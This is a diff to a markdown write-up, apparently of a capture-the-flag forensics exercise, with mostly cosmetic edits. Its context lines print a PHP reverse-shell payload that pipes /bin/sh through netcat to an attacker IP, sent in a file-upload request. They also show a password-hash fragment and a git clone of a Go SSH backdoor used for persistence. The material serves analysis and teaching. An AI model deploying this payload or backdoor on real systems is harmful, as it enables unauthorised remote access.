@@ -18,9 +18,7 @@ import TabItem from '@theme/TabItem';
 
 ```php
 <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
-```Hacked
-
-<br/>
+```
 
 - **PAYLOAD NAME:**  `payload.php`
 
@@ -29,14 +27,6 @@ POST /development/upload.php HTTP/1.1
 Host: 192.168.170.159
 Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
 Content-Type: application/x-php
-
-<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
-
-Content-Disposition: form-data; name="submit"
-Upload File
-
-HTTP/1.1 200 OK
-The file payload.php has been uploaded.GET /development/uploads/ HTTP/1.1
 ```
 
 <br/>
@@ -98,8 +88,8 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 
 <br/>
 
-- The Attacker Estabilished Persistence Using: <b style={{ color: 'Plum' }}>[Golang SSH Backdoor]</b>
-- <a class="button button--outline button--warning" href="https://github.com/NinjaJc01/ssh-backdoor">GO SSH Backdoor Github</a>
+- The Attacker Estabilished Persistence Using: <b style={{ color: 'PowderBlue' }}>[GO SSH Backdoor]</b>
+- <a class="button button--outline button--info" href="https://github.com/NinjaJc01/ssh-backdoor">GO SSH Backdoor Github</a>
 
 ```bash
 james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor
